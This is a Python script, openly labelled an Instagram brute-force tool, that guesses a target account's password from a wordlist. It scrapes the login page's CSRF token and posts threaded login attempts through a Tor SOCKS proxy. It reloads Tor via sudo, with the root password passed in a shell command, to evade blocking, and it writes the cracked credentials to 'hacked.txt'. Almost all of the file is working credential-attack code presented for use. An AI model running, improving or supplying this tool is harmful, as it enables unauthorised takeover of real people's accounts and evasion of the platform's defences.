from bs4 import BeautifulSoup
import json, re, requests
import time
import  random
from datetime import datetime
from threading import *
import os
import argparse


connection_lock = BoundedSemaphore()




class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'



def get_args():
	parser = argparse.ArgumentParser(description=' instagram Brute Force , By Eng Yazeed ..')
	parser.add_argument('-u', '--username', dest="username", required=True, action='store', help='Targeted username')
	parser.add_argument('-p', '--passwordfile', dest="passfile", required=True, action='store', help=' Your wordlist . ')
	parser.add_argument('-r', '--root', dest="root", required=True, action='store', help=' Your sudo root password . ')

	args = parser.parse_args()
	return args


args = get_args()
username = args.username
passfile = args.passfile
fx = args.root


def change():
    sudoPassword = fx
    command = 'service tor reload'
    p = os.system('echo %s|sudo -S %s' % (sudoPassword, command))




print(style.RED ,'''MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMds+:--------:+sdNMMMMMMMMMMM
MMMMMMMMms:-+sdNMMMMMMMMNdy+--omMMMMMMMM
MMMMMMh:` /mMMMMMMMMMMMMMMMMm+ `-yMMMMMM
MMMMd--hN``--sNMMMMMMMMMMNy:..`md:.hMMMM
MMM+`yMMMy hd+./hMMMMMMh/.+dd sMMMh`/MMM
MM:.mMMMMM:.NMMh/.+dd+./hMMM--MMMMMm--NM
M+`mMMMMMMN`+MMMMm-  .dMMMMo mMMMMMMN.:M
d yMMMMMMMMy dNy:.omNs--sNm oMMMMMMMMh h
/`MMMMMMMMMM.`.+dMMMMMMm+.``NMMMMMMMMM-:
.:MMMMMMMd+./`oMMMMMMMMMMs /.+dMMMMMMM/`
.:MMMMmo.:yNMs dMMMMMMMMm`oMNy:.omMMMM/`
/`MNy:.omMMMMM--MMMMMMMM:.MMMMMNs--sNM.:
d -` :++++++++: /++++++/ :++++++++:  : h
M+ yddddddddddd+ yddddy /dddddddddddy`/M
MM/.mMMMMMMMMMMM.-MMMM/.NMMMMMMMMMMm.:NM
MMMo`sMMMMMMMMMMd sMMy hMMMMMMMMMMy`+MMM
MMMMd--hMMMMMMMMM+`mN`/MMMMMMMMMh--hMMMM
MMMMMMh:.omMMMMMMN.:/`NMMMMMMms.:hMMMMMM
MMMMMMMMNs:./shmMMh  yMMNds/.:smMMMMMMMM
MMMMMMMMMMMMdy+/---``---:+sdMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''')
print(style.BLUE + 'Coded By ENG Yazeed . ')
print(style.BLUE + 'Add me in snapchat jp-q  (:')
print(style.BLUE + 'add me in instagram commplicated (:')
















proxy = {
    'http': 'socks5://localhost:9050',
    'https': 'socks5://localhost:9050'
}



url = 'https://www.instagram.com/accounts/login/'

def instagram(user, password, release):
	
    
    try:
          
        session = requests.Session()
        session.headers = {'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"}
        session.headers.update({'Referer': url})
        
        
        csrfRequest = session.get(url)
        
        script = BeautifulSoup(csrfRequest.content, 'html.parser').find('body').find("script", text=re.compile('window._sharedData'))

        data = json.loads(script.string.split("window._sharedData = ")[1][:-1])
        
        csrf = data['config'].get('csrf_token')

  
        sec = int(datetime.now().timestamp())
        encPass = f'#PWD_INSTAGRAM_BROWSER:0:{sec}:{password}'
        login_data = {'username': user, 'enc_password': encPass}
        session.headers.update({'X-CSRFToken': csrf})
        session.trust_env = False
        login = session.post(url + "ajax/", data=login_data, allow_redirects=True, proxies=proxy)
        data = login.json()
        time.sleep(0.2)

        req_login = login.text
        

        if 'authenticated": true' in req_login:
        	
        	print(style.GREEN , 'Hacked ! > username ==> : ' + user + ': password ==> : ' + password )
        	with open('hacked.txt' , 'a') as x:
        		x.write('\n')
        		x.write(user + ':' + password + '\n')
        		

        elif 'two_factor_required' in req_login:

        	print((style.CYAN , '' + user + ':' + password + ' ->  Good It has to be checked '))
        	with open('results_NeedVerfiy.txt', 'a') as w:
        		w.write(user + ':' + password + '\n')
        elif 'false' in req_login:
        	print('*' * 30)
        	print(style.RED, 'Wrong pass {}'.format(password))
        	print('*' * 30)


      



        else :
        	
        	change()
        	time.sleep(0.5)
        	instagram(user, password,False)

   
            
    except Exception as e:
        print(e)
        pass

    finally:
        
        if release: connection_lock.release()


def main():
	fn = open(passfile, 'r')
	for line in fn.readlines():
		connection_lock.acquire()
		password = line.strip('\r').strip('\n')

		t = Thread(target=instagram, args=(username, \
			password, True))
		child = t.start()


if __name__ == '__main__':
    main()





